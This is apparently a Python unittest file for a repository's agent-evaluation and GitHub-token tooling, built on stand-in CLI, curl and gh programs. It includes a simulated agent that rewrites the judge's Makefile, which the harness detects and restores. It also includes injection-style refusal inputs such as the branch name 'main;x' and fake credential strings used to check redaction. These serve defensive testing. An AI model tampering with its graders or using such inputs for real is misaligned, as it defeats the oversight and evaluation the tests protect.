            given = dict(line.split("=", 1) for line in (cli / ("env-" + call)).read_text().splitlines() if "=" in line)
            self.assertEqual(set(given) - {"PWD", "OLDPWD", "SHLVL", "_"}, named, call)
            self.assertNotIn("NEVER-SEEN", (cli / ("env-" + call)).read_text(), call)
            # A scratch HOME, not the Maintainer's; the login in CONFIG_DIR alone.
            self.assertNotEqual(given["HOME"], str(self.home), call)
            self.assertEqual(given["CLAUDE_CONFIG_DIR"], str(self.cfg), call)
        args = (cli / "args").read_text().split("\n")
        self.assertEqual(args[args.index("-p") + 1], self.SENTENCE)
        self.assertEqual(args[args.index("--disallowedTools") + 1], "WebFetch,WebSearch,Task,Agent")
        self.assertIn("--max-turns", args)
        # The agent worked in the export, not in the repo, which is left as it was.
        self.assertNotEqual(pathlib.Path((cli / "cwd").read_text().strip()), folder)
        self.assertEqual((folder / "kernel" / "derive.py").read_text(), "def derive(f):\n    return f\n")
        texts = self.texts(self.out)
        self.assertEqual(sorted(texts), ["checked.json", "ran_at", "record.json", "requests.json"])
        record = json.loads(texts["record.json"])
        self.assertEqual(validate(record, context_eval.RUN_SCHEMA), [])
        self.assertEqual((record["verdicts"], record["passed"], record["commit"], record["cli_version"]),
                         ({"held_out_test": "pass", "verify": "pass", "mutant": "killed"}, True, commit, self.PIN))
        self.assertEqual(record["added"], {"test": "tests/test_decide.py::test_empty_diff_never_converges",
                                           "mutant": "an empty diff converges", "reason": "empty_diff"})
        self.assertEqual([c["path"] for c in record["changed"]], ["kernel/derive.py", "tests/test_decide.py", "tools/mutants.py"])
        self.assertEqual(record["read"], ["AGENTS.md", "kernel/AGENTS.md", "kernel/derive.py"])
        self.assertEqual((record["outside_reads"], record["restored"]), (2, []))
        checked = json.loads(texts["checked.json"])
        self.assertEqual((checked["agent"]["exit"], checked["agent"]["stderr"]["lines"], checked["mutants"]["added"]),
                         (0, 1, ["an empty diff converges"]))
        self.assertIn("none", checked["sandbox"])
        everything = "".join(texts.values()) + ran.stdout + ran.stderr
        for word in self.PROSE.values():
            self.assertNotIn(word, everything)
        self.assertNotIn("NEVER-SEEN", everything)
        self.assertNotIn("test_the_rule_holds", everything, "the held-out test is never recorded")

    def test_a_verdict_that_fails_is_recorded_and_fails_the_run(self):
        folder, commit = self.repo(verify="verify:\n\t@exit 1\n")
        cli = self.stand_in()
        ran = self.run_script(self.out, self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py", cli / "claude")
        self.assertEqual(ran.returncode, 1, ran.stderr)
        record = json.loads((self.out / "record.json").read_text())
        self.assertEqual((record["verdicts"]["verify"], record["passed"]), ("fail", False))
        # The held-out test that fails: the rule the agent wrote is not the one the answer expects.
        (self.aside / "test_held_out.py").write_text("import unittest\n\n\nclass HeldOut(unittest.TestCase):\n"
                                                    "    def test_the_rule_holds(self):\n        self.fail('not the rule')\n")
        folder, commit = self.repo()
        out = self.home.parent / (self.home.name + "-held-out-fails")
        ran = self.run_script(out, self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py", self.stand_in() / "claude")
        self.assertEqual(ran.returncode, 1, ran.stderr)
        record = json.loads((out / "record.json").read_text())
        self.assertEqual((record["verdicts"]["held_out_test"], record["verdicts"]["verify"], record["passed"]), ("fail", "pass", False))
        self.assertNotIn("not the rule", "".join(self.texts(out).values()) + ran.stdout + ran.stderr)
        # The agent's mutant that survives, by the whole check's exit and its line, fails the run.
        (self.aside / "test_held_out.py").write_text("import unittest\nfrom kernel import derive\n\n\nclass HeldOut(unittest.TestCase):\n"
                                                    "    def test_the_rule_holds(self):\n        self.assertEqual(derive.rule({}), 'empty_diff')\n")
        folder, commit = self.repo()
        out = self.home.parent / (self.home.name + "-survives")
        ran = self.run_script(out, self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py",
                              self.stand_in(survive="an empty diff converges") / "claude")
        self.assertEqual(ran.returncode, 1, ran.stderr)
        record = json.loads((out / "record.json").read_text())
        self.assertEqual((record["verdicts"]["mutant"], record["passed"]), ("survived", False))
        # The agent that rewrites the judge's Makefile: it is put back as made, recorded, and the judge is the export's own.
        folder, commit = self.repo()
        out = self.home.parent / (self.home.name + "-tampered")
        ran = self.run_script(out, self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py",
                              self.stand_in(tamper=True) / "claude")
        self.assertEqual(ran.returncode, 0, ran.stderr)
        record = json.loads((out / "record.json").read_text())
        self.assertEqual((record["restored"], record["verdicts"]["verify"], record["passed"]), (["Makefile"], "pass", True))
        self.assertNotIn("Makefile", [c["path"] for c in record["changed"]], "put back before the changes are counted")

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder, commit = self.repo()
        cli = self.stand_in()
        existing = self.home.parent / (self.home.name + "-taken")
        existing.mkdir()
        two = self.aside / "two"
        two.write_text("One rule here. And `another_one` there.\n")
        no_code = self.aside / "no-code"
        no_code.write_text("An empty diff never converges, with no code named.\n")
        inside = folder / "test_inside.py"
        inside.write_text("")
        linked = self.aside / "test_linked.py"
        linked.symlink_to(inside)
        good = [self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py", cli / "claude"]
        cases = [("OUT exists", [existing] + good, "exists; name a new directory"),
                 ("OUT inside the repo", [ROOT / "never-made"] + good, "OUT is inside the repo"),
                 ("OUT inside REPO", [folder / "never-made"] + good, "OUT is inside REPO"),
                 ("CONFIG_DIR is HOME", [self.out, self.home] + good[1:], "the home directory or holds it"),
                 ("CONFIG_DIR under ~/.claude", [self.out, self.home / ".claude" / "x"] + good[1:], "under ~/.claude"),
                 ("REPO not a checkout", [self.out, self.cfg, self.aside] + good[2:], "REPO is not a git checkout"),
                 ("COMMIT unknown", [self.out, self.cfg, folder, "0" * 40] + good[3:], "COMMIT is not a commit in REPO"),
                 ("two sentences", good[:3] and [self.out] + good[:3] + [two] + good[4:], "not one sentence"),
                 ("no code", [self.out] + good[:3] + [no_code] + good[4:], "names no reason code"),
                 ("HELD_OUT inside REPO", [self.out] + good[:4] + [inside, cli / "claude"], "stay outside the repo"),
                 ("HELD_OUT linked into REPO", [self.out] + good[:4] + [linked, cli / "claude"], "stay outside the repo"),
                 ("CONFIG_DIR inside REPO", [self.out, folder / "kernel"] + good[1:], "CONFIG_DIR is inside REPO"),
                 ("HELD_OUT not a test", [self.out] + good[:4] + [self.aside / "sentence", cli / "claude"], "is named test_")]
        (self.home / ".claude" / "x").mkdir(parents=True)
        for name, args, said in cases:
            ran = subprocess.run(["bash", str(self.SCRIPT), *map(str, args)], cwd=SCRATCH.name, capture_output=True, text=True,
                                 env={"PATH": os.environ["PATH"], "HOME": str(self.home), "LANG": "C"}, timeout=120)
            self.assertEqual(ran.returncode, 2, (name, ran.stderr))
            self.assertIn(said, ran.stderr, name)
            self.assertFalse((cli / "env-version").exists(), name + ": nothing was asked")
        self.assertFalse((ROOT / "never-made").exists())
        # The wrong version, after asking it and before the agent.
        wrong = self.stand_in(version="0.0.1")
        ran = self.run_script(self.out, self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py", wrong / "claude")
        self.assertEqual(ran.returncode, 1)
        self.assertIn("is version '0.0.1', exit 0, not " + self.PIN, ran.stderr)
        self.assertFalse((wrong / "args").exists(), "the agent was not asked")


class ReaderTrialScript(unittest.TestCase):
    """`tools/trial_reader_reads.sh`, run against a stand-in curl and openssl and never GitHub (issues 222 and 231): each
    refusal before anything is minted, two tokens each narrowed to one permission on the canary alone, every read made
    with each and kept with its status, each token revoked, and no token anywhere the Maintainer hands to a session."""

    SCRIPT = ROOT / "tools" / "trial_reader_reads.sh"
    CANARY = [r for r in json.loads((ROOT / "config" / "apps.json").read_text())["apps"]["reader"]["installed_on"]
              if r != "combsmith/software-factory"][0]
    TOKEN = "gh" + "s_" + "R" * 36
    # The stand-in GitHub: each call is logged with its method, URL, body and whether a credential came on stdin; a mint
    # answers a token, a revocation the status in revoke.status, and a read an answer by its path and the token's grant.
    CURL = r'''#!/usr/bin/env python3
import json, os, sys
here = os.path.dirname(os.path.abspath(__file__))
args = sys.argv[1:]
url = [a for a in args if a.startswith("https://")][-1]
method = args[args.index("-X") + 1] if "-X" in args else "GET"
body = args[args.index("-d") + 1] if "-d" in args else None
said = sys.stdin.read() if "@-" in args else ""
grant = open(os.path.join(here, "grant")).read().strip() if os.path.exists(os.path.join(here, "grant")) else ""
with open(os.path.join(here, "log"), "a") as log:
    log.write(json.dumps({"method": method, "url": url, "body": body, "credential": "Bearer " in said,
                          "grant": grant}) + "\n")
if url.endswith("/access_tokens"):
    status = open(os.path.join(here, "mint.status")).read().strip()
    if os.path.exists(os.path.join(here, "cut")):
        # The answer cut short after the token, as a transfer that broke would leave it.
        sys.stdout.write('{"token": "' + "gh" + "s_" + "R" * 36 + '", "expires_at": "2026\n201')
        sys.exit(18)
    if status != "201":
        sys.stdout.write(json.dumps({"message": "Bad credentials"}) + "\n" + status)
        sys.exit(0)
    open(os.path.join(here, "grant"), "w").write(json.loads(body)["permissions"] and list(json.loads(body)["permissions"])[0])
    sys.stdout.write(json.dumps({"token": "''' + "gh" + "s_" + "R" * 36 + r'''", "permissions": json.loads(body)["permissions"],
                                 "repository_selection": "selected"}) + "\n201")
    # A transfer that failed after the whole answer came, as curl's exit 18 says of a partial one.
    sys.exit(18 if os.path.exists(os.path.join(here, "broke")) else 0)
if method == "DELETE":
    sys.stdout.write(open(os.path.join(here, "revoke.status")).read().strip())
    sys.exit(0)
roles = json.load(open(os.path.join(here, "roles")))
if os.path.exists(os.path.join(here, "slow")):
    # Mid-read: tell the test on one pipe, and wait on the other until the test lets the read end, or is gone.
    told, held = (int(n) for n in open(os.path.join(here, "slow")).read().split())
    os.write(told, b"r")
    os.read(held, 1)
if "/collaborators/" in url:
    login = url.split("/collaborators/")[1].split("/")[0]
    if login in roles:
        status, answer = 200, {"permission": roles[login], "role_name": roles[login], "user": {"login": login, "type": "User"}}
    else:
        status, answer = 404, {"message": "Not Found"}
elif "/activity" in url:
    if grant == "contents":
        status, answer = 200, [{"before": "0" * 40, "after": "a" * 40, "activity_type": "push",
                                "actor": {"login": "don-petry", "type": "User"}}]
    else:
        status, answer = 403, {"message": "Resource not accessible by integration"}
else:
    status, answer = 404, {"message": "Not Found"}
# Every answer carries a credential-shaped string, as an answer may: the redaction must take it out before OUT.
if isinstance(answer, dict):
    answer["leak"] = "gh" + "s_" + "L" * 36
sys.stdout.write("HTTP/2 %d\r\ncontent-type: application/json\r\n\r\n%s" % (status, json.dumps(answer)))
'''
    OPENSSL = '''#!/bin/sh
case "$1" in
  base64) cat | od -An -tx1 | tr -d ' \\n' ;;
  dgst) cat > /dev/null; printf 'signed' ;;
  *) exit 9 ;;
esac
'''

    def setUp(self):
        self.stand_in = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        for name, text in (("curl", self.CURL), ("openssl", self.OPENSSL)):
            (self.stand_in / name).write_text(text)
            (self.stand_in / name).chmod(0o755)
        (self.stand_in / "mint.status").write_text("201\n")
        (self.stand_in / "revoke.status").write_text("204\n")
        (self.stand_in / "roles").write_text(json.dumps({"don-petry": "admin", "a-writer": "write", "a-triager": "triage",
                                                         "an-outsider": "read"}))
        self.key = self.stand_in / "reader.pem"
        self.key.write_text("not a key\n")
        self.out = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"

    # OUT names the refusal cases give inside the repo. A broken script could make one, in a copy the mutation check
    # lends to the next mutant, so each is removed after the test whether or not it was refused.
    INSIDE = ("never-made-by-the-reader", "never-made-by-the-reader-through-a-link", "scratch-of-the-reader")

    def tearDown(self):
        for name in self.INSIDE:
            shutil.rmtree(ROOT / name, ignore_errors=True)

    def run_script(self, *args, out=None, tmpdir=None) -> subprocess.CompletedProcess:
        env = {"PATH": "%s:%s" % (self.stand_in, os.environ["PATH"]), "HOME": str(self.stand_in), "LANG": "C",
               "GH_TOKEN": "gh" + "p_NEVER-SEEN"}
        env.update({"TMPDIR": str(tmpdir)} if tmpdir else {})
        given = args or (self.CANARY, "main", "don-petry", "a-writer", "a-triager", "an-outsider")
        return subprocess.run(["sh", str(self.SCRIPT), str(out or self.out), str(self.key), *given],
                              cwd=SCRATCH.name, capture_output=True, text=True, env=env, timeout=120)

    def calls(self) -> list:
        log = self.stand_in / "log"
        return [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []

    def test_each_read_is_made_with_each_token_kept_with_its_status_and_no_token_is_kept(self):
        ran = self.run_script()
        self.assertEqual(ran.returncode, 0, ran.stderr + ran.stdout)
        calls = self.calls()
        mints = [c for c in calls if c["url"].endswith("/access_tokens")]
        self.assertEqual([json.loads(m["body"]) for m in mints],
                         [{"repositories": [self.CANARY.split("/")[1]], "permissions": {"metadata": "read"}},
                          {"repositories": [self.CANARY.split("/")[1]], "permissions": {"contents": "read"}}])
        self.assertEqual([c["method"] for c in calls if c["method"] == "DELETE"], ["DELETE", "DELETE"])
        self.assertTrue(all(c["credential"] for c in calls), "every call carries its credential on stdin")
        reads = [c for c in calls if c["method"] == "GET"]
        self.assertEqual([c["url"].split("/repos/")[1] for c in reads[:5]],
                         ["%s/collaborators/%s/permission" % (self.CANARY, login)
                          for login in ("don-petry", "a-writer", "a-triager", "an-outsider")]
                         + ["%s/activity?ref=refs/heads/main&per_page=5" % self.CANARY])
        self.assertEqual(len(reads), 10)
        texts = {p.name: p.read_text() for p in self.out.iterdir()}
        self.assertEqual(sorted(texts), sorted(["ran_at", "requests.json"] + ["clean-%d" % n for n in range(1, 11)]
                                               + ["redacted-%d" % n for n in range(1, 11)]))
        asked = json.loads(texts["requests.json"])
        statuses = [(a["narrowed_to"], "activity" if "/activity?" in a["call"] else "permission", a["status"])
                    for a in asked if "call" in a]
        self.assertIn(("metadata: read", "activity", 403), statuses)
        self.assertIn(("contents: read", "activity", 200), statuses)
        self.assertIn(("metadata: read", "permission", 200), statuses)
        self.assertEqual([a for a in asked if "revoked" in a],
                         [{"revoked": "metadata: read", "status": 204}, {"revoked": "contents: read", "status": 204}])
        self.assertIn('"permission": "triage"', texts["clean-3"])
        everything = "".join(texts.values()) + ran.stdout + ran.stderr
        # Each answer carried a credential-shaped string; the redaction took it out of every clean answer, and said where.
        self.assertNotIn("gh" + "s_" + "L" * 36, everything)
        self.assertTrue(all("leak" in texts["redacted-%d" % n] for n in (1, 2, 3, 4, 6, 7, 8, 9)))
        self.assertNotIn(self.TOKEN, everything)
        self.assertNotIn("NEVER-SEEN", everything)

    def test_each_refusal_comes_before_anything_is_minted(self):
        self.out.parent.mkdir(parents=True, exist_ok=True)
        cases = [((self.CANARY, "main", "don-petry"), self.out.parent, "exists"),
                 ((self.CANARY, "main", "don-petry"), ROOT / self.INSIDE[0], "inside the repo"),
                 (("combsmith/software-factory", "main", "don-petry"), None, "is not the canary the reader is installed on"),
                 (("combsmith/elsewhere", "main", "don-petry"), None, "is not the canary the reader is installed on"),
                 (("combsmith", "main", "don-petry"), None, "is not owner/name"),
                 ((self.CANARY, "main;x", "don-petry"), None, "is not a branch name"),
                 ((self.CANARY, "../x", "don-petry"), None, "is not a branch name"),
                 ((self.CANARY, "main", "don/petry"), None, "is not a login"),
                 ((self.CANARY, "main", "-x"), None, "is not a login")]
        for args, out, said in cases:
            ran = self.run_script(*args, out=out)
            self.assertNotEqual(ran.returncode, 0, args)
            self.assertIn(said, ran.stderr, args)
            self.assertEqual(self.calls(), [], args)
        self.key.unlink()
        ran = self.run_script()
        self.assertIn("cannot read the key file", ran.stderr)
        self.assertEqual(self.calls(), [])

    def test_a_mint_answered_whole_by_a_transfer_that_failed_is_revoked_and_told(self):
        # curl read the whole answer and still failed: the token is not trusted, but revoked, and the run stops
        # (Codex on PR 298).
        (self.stand_in / "broke").write_text("yes\n")
        ran = self.run_script()
        self.assertEqual(ran.returncode, 1)
        self.assertEqual([c["method"] for c in self.calls()], ["POST", "DELETE"])
        self.assertNotIn(self.TOKEN, ran.stdout + ran.stderr)

    def test_a_scratch_directory_inside_the_repo_is_refused_before_anything_is_minted(self):
        # The raw answers are kept outside the repo, as OUT is: a TMPDIR inside it, or reached through a link into it,
        # is refused and the directory mktemp made is removed (Codex on PR 298).
        inside = ROOT / self.INSIDE[2]
        inside.mkdir()
        link = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "into-the-repo"
        link.symlink_to(inside)
        for tmpdir in (inside, link):
            ran = self.run_script(tmpdir=tmpdir)
            self.assertEqual(ran.returncode, 2, tmpdir)
            self.assertIn("is inside the repo; set TMPDIR outside it", ran.stderr, tmpdir)
            self.assertEqual((self.calls(), list(inside.iterdir())), ([], []), tmpdir)

    def test_a_mint_answered_201_and_cut_short_is_revoked_and_told(self):
        # curl cut the mint's answer short: GitHub minted a token the script cannot parse. It finds the token, revokes
        # it, says so, and stops; nothing is read with it, and no token reaches what it hands over.
        (self.stand_in / "cut").write_text("yes\n")
        ran = self.run_script()
        self.assertEqual(ran.returncode, 1)
        self.assertEqual([c["method"] for c in self.calls()], ["POST", "DELETE"])
        self.assertNotIn(self.TOKEN, ran.stdout + ran.stderr)
        self.assertFalse(self.out.exists() and any(self.TOKEN in p.read_text() for p in self.out.iterdir()))

    def test_an_output_folder_reached_through_a_link_into_the_repo_is_refused(self):
        # OUT is resolved as the file system resolves it: a folder whose parent is a link into the repo is inside it.
        link = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "into-the-repo"
        link.symlink_to(ROOT)
        ran = self.run_script(out=link / self.INSIDE[1])
        self.assertNotEqual(ran.returncode, 0)
        self.assertIn("inside the repo", ran.stderr)
        self.assertEqual(self.calls(), [])

    def test_a_signal_mid_read_revokes_the_live_token(self):
        # Interrupted while a token is live, the script revokes it on its way out, and keeps no raw answer. The stand-in
        # says on a pipe that a read has begun, and holds it until the script has been signalled: no clock is read, so
        # the mutation check runs this test. A script that ends first closes both pipes, so nothing waits for ever.
        told_r, told_w = os.pipe()
        held_r, held_w = os.pipe()
        (self.stand_in / "slow").write_text("%d %d\n" % (told_w, held_r))
        env = {"PATH": "%s:%s" % (self.stand_in, os.environ["PATH"]), "HOME": str(self.stand_in), "LANG": "C"}
        running = subprocess.Popen(["sh", str(self.SCRIPT), str(self.out), str(self.key), self.CANARY, "main", "don-petry"],
                                   cwd=SCRATCH.name, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=env,
                                   pass_fds=(told_w, held_r))
        os.close(told_w)
        os.close(held_r)
        try:
            begun = os.read(told_r, 1)
            (self.stand_in / "slow").unlink()
            running.terminate()
        finally:
            os.close(told_r)
            os.close(held_w)
        out, err = running.communicate(timeout=60)
        self.assertEqual(begun, b"r", "the script reached no read: " + err)
        self.assertNotEqual(running.returncode, 0)
        self.assertIn("DELETE", [c["method"] for c in self.calls()])
        self.assertIn("stopped with a token live; revoking it returned 204", err)
        self.assertNotIn(self.TOKEN, out + err)

    def test_curl_reads_no_configuration_of_the_maintainers(self):
        # A .curlrc that turns on verbose would print the Authorization header; -q comes first on every call.
        (self.stand_in / ".curlrc").write_text("verbose\n")
        script = self.SCRIPT.read_text()
        calls = [line for line in script.splitlines() if "| curl " in line]
        self.assertEqual(len(calls), 3)
        self.assertTrue(all(line.split("| curl ", 1)[1].startswith("-q ") for line in calls))

    def test_a_refused_mint_or_revocation_stops_the_run_and_says_so(self):
        (self.stand_in / "mint.status").write_text("401\n")
        ran = self.run_script()
        self.assertEqual(ran.returncode, 1)
        self.assertIn("no token narrowed to metadata was minted (status 401)", ran.stderr)
        self.assertEqual([c for c in self.calls() if c["method"] == "GET"], [])
        (self.stand_in / "log").unlink()
        (self.stand_in / "mint.status").write_text("201\n")
        (self.stand_in / "revoke.status").write_text("500\n")
        ran = self.run_script(out=self.out.parent / "again")
        self.assertEqual(ran.returncode, 1)
        self.assertIn("returned 500, not 204. The token may be live", ran.stderr)
        self.assertNotIn(self.TOKEN, ran.stdout + ran.stderr)
        # The exit trap tried once more to revoke the live token.
        self.assertEqual(len([c for c in self.calls() if c["method"] == "DELETE"]), 2)


class Rulesets(unittest.TestCase):
    """`config/rulesets.json` against `config/defaults.json` (issues 62 and 95): a value held in both agrees."""

    def setUp(self):
        self.rulesets = json.loads((ROOT / "config" / "rulesets.json").read_text())
        self.defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.main = self.rulesets["rulesets"]["main"]["rules"]

    def run_on(self) -> list:
        return check_rulesets.run(tree({"config/rulesets.json": json.dumps(self.rulesets),
                                        "config/defaults.json": json.dumps(self.defaults)}))

    def test_this_repos_rulesets_agree_with_its_lenses(self):
        self.assertEqual(self.run_on(), [])

    def test_a_required_check_from_another_app_is_caught(self):
        self.main["required_status_checks"]["required_status_checks"][0]["integration_id"] = 57789
        self.assertTrue(caught(self.run_on(), "pins the check 'verify' to App 57789"))

    def test_a_required_check_no_lens_reads_is_caught(self):
        self.main["required_status_checks"]["required_status_checks"].append({"context": "lint", "integration_id": 15368})
        self.assertTrue(caught(self.run_on(), "requires the check 'lint', which no deterministic Lens"))

    def test_the_verification_check_must_be_required(self):
        self.main["required_status_checks"]["required_status_checks"] = [{"context": "CodeQL", "integration_id": 57789}]
        self.assertTrue(caught(self.run_on(), "does not require the verify Lens's check"))

    def test_a_code_scanning_tool_no_lens_reads_is_caught(self):
        self.main["code_scanning"]["code_scanning_tools"][0]["tool"] = "Semgrep"
        self.assertTrue(caught(self.run_on(), "names the tool 'Semgrep'"))
        self.main["code_scanning"]["code_scanning_tools"][0]["tool"] = "verify"    # a Lens a workflow runs
        self.assertTrue(caught(self.run_on(), "names the tool 'verify'"))

    def test_files_that_cannot_be_read_are_a_problem(self):
        self.assertTrue(caught(check_rulesets.run(tree({"config/rulesets.json": "{}"})), "cannot be read"))

    def test_a_value_of_the_wrong_kind_is_a_problem_not_a_crash(self):
        self.main["required_status_checks"] = "x"
        self.assertTrue(caught(self.run_on(), "holds a value of the wrong kind"))


def as_github(name: str, recorded: dict) -> dict:
    """A ruleset of config/rulesets.json as GitHub answers it, sharing nothing with the record."""
    recorded = copy.deepcopy(recorded)
    return {"id": recorded["id"], "name": name, "target": recorded["target"], "source_type": "Repository",
            "enforcement": recorded["enforcement"],
            "conditions": {"ref_name": {"exclude": recorded["exclude"], "include": recorded["include"]}},
            "rules": [dict({"type": t}, **({"parameters": p} if p else {})) for t, p in recorded["rules"].items()],
            "bypass_actors": recorded["bypass_actors"], "node_id": "RRS_x", "current_user_can_bypass": "never"}


class RulesetsDrift(unittest.TestCase):
    """`tools/rulesets_drift.py` compares what GitHub answered with the record, whole; `tools/rulesets_drift.sh` reads
    through a stand-in gh, never the real one, and only reads."""

    SCRIPT = ROOT / "tools" / "rulesets_drift.sh"
    # The stand-in gh: it records each call, and answers `api --include CALL` from the file named for the call.
    STAND_IN = """#!/usr/bin/env python3
import os, sys
here = os.path.dirname(os.path.abspath(__file__))
open(os.path.join(here, "calls"), "a").write(" ".join(sys.argv[1:]) + "\\n")
name = sys.argv[-1].replace("/", "_").replace("?", "_")
try:
    sys.stdout.write(open(os.path.join(here, name)).read())
except OSError:
    sys.stdout.write("HTTP/2.0 404 Not Found\\nContent-Type: application/json\\n\\n{}")
    sys.exit(1)
"""

    def setUp(self):
        self.recorded = json.loads((ROOT / "config" / "rulesets.json").read_text())["rulesets"]
        self.live = {name: as_github(name, r) for name, r in self.recorded.items()}

    def compare(self, listed=None, status=200) -> list:
        listed = [{"id": r["id"], "name": n} for n, r in self.live.items()] if listed is None else listed
        return rulesets_drift.compare(self.recorded, listed, {r["id"]: (status, r) for r in self.live.values()})

    def test_the_live_rulesets_as_recorded_are_no_drift(self):
        self.assertEqual(self.compare(), [])

    def test_a_changed_rule_is_drift(self):
        main = self.live["main"]["rules"]
        [scan] = [r for r in main if r["type"] == "code_scanning"]
        scan["parameters"]["code_scanning_tools"][0]["security_alerts_threshold"] = "high_or_higher"
        self.assertTrue(caught(self.compare(), "ruleset 'main', rule code_scanning"))
        main.remove(scan)
        self.assertTrue(caught(self.compare(), "rule code_scanning: config/rulesets.json records"))
        main.append({"type": "required_signatures"})
        self.assertTrue(caught(self.compare(), "rule required_signatures"))

    def test_a_changed_bypass_or_target_is_drift(self):
        self.live["factory release tags"]["bypass_actors"].append({"actor_id": 4, "actor_type": "RepositoryRole",
                                                                   "bypass_mode": "always"})
        self.live["main"]["conditions"]["ref_name"]["include"] = ["refs/heads/next"]
        problems = self.compare()
        self.assertTrue(caught(problems, "ruleset 'factory release tags', bypass_actors"))
        self.assertTrue(caught(problems, "ruleset 'main', include"))

    def test_a_ruleset_added_or_taken_away_is_drift(self):
        listed = [{"id": r["id"], "name": n} for n, r in self.live.items()]
        self.assertTrue(caught(self.compare(listed + [{"id": 1, "name": "org-wide"}]), "'org-wide', id 1, is not in"))
        self.assertTrue(caught(self.compare(listed[:1]), "records the ruleset 'factory release tags', id"))

    def test_a_ruleset_sharing_a_recorded_name_is_drift(self):
        org = copy.deepcopy(self.live["main"])
        org.update(id=99, source_type="Organization", enforcement="evaluate")
        listed = [{"id": 99, "name": "main"}] + [{"id": r["id"], "name": n} for n, r in self.live.items()]
        live = {r["id"]: (200, r) for r in self.live.values()}
        live[99] = (200, org)
        self.assertTrue(caught(rulesets_drift.compare(self.recorded, listed, live), "'main', id 99, is not in"))
        self.assertTrue(caught(self.compare([{"id": 7, "name": "main"}, {"id": 25183656, "name": "factory release tags"}]),
                               "records the ruleset 'main', id 24886320, and the repo has none"))

    def test_a_rule_type_given_twice_is_drift(self):
        self.live["main"]["rules"].append({"type": "deletion"})
        self.assertTrue(caught(self.compare(), "rule (a rule type given twice)"))

    def test_the_answers_are_read_from_stdin_in_the_order_listed(self):
        def run(*answers, argv=()):
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                code = rulesets_drift.main(list(argv), io.BytesIO("\0".join(answers).encode()))
            return code, out.getvalue()
        head = "HTTP/2.0 200 OK\nContent-Type: application/json\n\n"
        listed = [{"id": r["id"], "name": n} for n, r in self.live.items()]
        bodies = [head + json.dumps(self.live[n]) for n in self.live]
        self.assertEqual(run(head + json.dumps(listed), argv=["--ids"]), (0, "%d\n%d\n" % tuple(i["id"] for i in listed)))
        self.assertEqual(run(head + json.dumps(listed), *bodies), (0, "no drift\n"))
        code, out = run(head + json.dumps(listed), bodies[0])
        self.assertEqual(code, 1)
        self.assertIn("2 rulesets were listed and 1 answers given", out)
        self.assertEqual(run("HTTP/2.0 404 Not Found\n\n{}", argv=["--ids"]), (0, "\n"))

    def test_only_a_whole_number_is_an_id(self):
        self.assertEqual(rulesets_drift.ids([{"id": 3}, {"id": "1 2"}, {"id": "../../user"}, {"id": True}, {"id": 2.0},
                                             {"name": "x"}, "x"]), [3])
        self.assertEqual(rulesets_drift.ids({"id": 3}), [])

    def test_a_full_page_says_more_may_follow(self):
        listed = [{"id": r["id"], "name": n} for n, r in self.live.items()]
        filler = [{"id": 1000 + i, "name": "main"} for i in range(rulesets_drift.PAGE - len(listed))]
        self.assertTrue(caught(self.compare(listed + filler), "a whole page, so more may follow"))
        self.assertFalse(caught(self.compare(listed + filler[1:]), "a whole page"))

    def test_an_answer_that_is_not_200_or_no_list_is_drift(self):
        self.assertTrue(caught(self.compare(status=404), "answered 404, not 200"))
        self.assertTrue(caught(rulesets_drift.compare(self.recorded, None, {}), "list of the repo's rulesets could not"))

    def run_script(self, live: dict) -> tuple:
        bin_ = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (bin_ / "gh").write_text(self.STAND_IN)
        (bin_ / "gh").chmod(0o755)
        # As real gh writes them: each line of the head ends in CR LF.
        head = "HTTP/2.0 200 OK\r\nContent-Type: application/json\r\nAuthorization: token ghs_%s\r\n\r\n" % ("x" * 36)
        listed = [{"id": r["id"], "name": n} for n, r in live.items()]
        (bin_ / "repos_combsmith_software-factory_rulesets_per_page=100").write_text(head + json.dumps(listed))
        for r in live.values():
            (bin_ / ("repos_combsmith_software-factory_rulesets_%d" % r["id"])).write_text(head + json.dumps(r))
        env = dict(os.environ, PATH="%s:/usr/bin:/bin" % bin_, TMPDIR=str(pathlib.Path(SCRATCH.name).resolve()))
        # The stand-in, never a real gh further down the path, answers: else the test would read GitHub.
        self.assertEqual(shutil.which("gh", path=env["PATH"]), str(bin_ / "gh"))
        done = subprocess.run(["sh", str(self.SCRIPT)], env=env, capture_output=True, text=True, timeout=60)
        return done, (bin_ / "calls").read_text().splitlines()

    def test_the_script_reads_each_ruleset_redacts_it_and_compares(self):
        done, calls = self.run_script(self.live)
        self.assertEqual((done.returncode, done.stdout.strip()), (0, "no drift"), done.stderr)
        ids = sorted(r["id"] for r in self.live.values())
        self.assertEqual(sorted(calls), sorted(["api --include repos/combsmith/software-factory/rulesets?per_page=100"]
                                               + ["api --include repos/combsmith/software-factory/rulesets/%d" % i
                                                  for i in ids]))
        self.live["main"]["enforcement"] = "evaluate"
        done, _ = self.run_script(self.live)
        self.assertEqual(done.returncode, 1)
        self.assertIn("ruleset 'main', enforcement", done.stdout)
        self.assertNotIn("ghs_", done.stdout + done.stderr)

    def test_a_scratch_directory_inside_the_repo_is_refused_however_it_is_reached(self):
        link = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "into-the-repo"
        script = self.SCRIPT.read_text().replace("dir=$(mktemp -d)", 'dir="%s"' % link)
        root = clone({"tools/rulesets_drift.sh": script, "scratch/.keep": ""})   # a copy: the repo itself is not written
        link.symlink_to(root / "scratch")
        done = subprocess.run(["sh", str(root / "tools" / "rulesets_drift.sh")], env=dict(os.environ, PATH="/nowhere:/usr/bin:/bin"),
                              capture_output=True, text=True, timeout=60)
        self.assertEqual(done.returncode, 2, done.stderr)
        self.assertIn("is inside the repo", done.stderr)


class Copies(unittest.TestCase):
